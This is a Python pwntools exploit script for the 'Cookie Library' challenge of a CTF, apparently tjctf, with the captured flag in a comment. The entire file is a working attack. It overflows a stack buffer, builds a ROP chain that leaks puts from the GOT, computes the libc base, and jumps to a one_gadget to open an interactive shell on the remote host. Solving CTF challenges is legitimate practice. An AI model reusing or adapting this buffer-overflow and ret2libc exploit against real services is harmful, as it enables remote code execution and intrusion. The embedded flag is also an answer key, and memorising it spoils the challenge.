#exploit for Cookie Library
#this exploit worked live during the ctf
#flag=tjctf{c00ki3_yum_yum_mmMmMMmMMmmMm}

from pwn import *
target=remote('p1.tjctf.org', 8010 )
libc=ELF('/media/sf_kalishared/livectfs/moleconctf2020/knife/libc6_2.27-3ubuntu1_amd64.so')
print(target.recvuntil("tasty?\n"))
payload="A"*(0x50+8)

poprdi=0x400933
putsgot=0x600fb8
putsplt=0x400640
ret=0x40061e
restart=0x400797

payload+=p64(poprdi)
payload+=p64(putsgot)
payload+=p64(putsplt)
payload+=p64(restart)
target.sendline(payload)
print(target.recvline())
leak=target.recvline().strip("\n")
libc_puts=u64(leak+"\x00"*(8-len(leak)))
libc_base=libc_puts-libc.symbols["puts"]
gadget=0x4f322
libc_gadget=libc_base+gadget
print(hex(libc_base))

payload="A"*(0x50+8)
payload+=p64(ret)
payload+=p64(libc_gadget)
payload+=p64(0x0)*50
target.sendline(payload)

target.interactive()
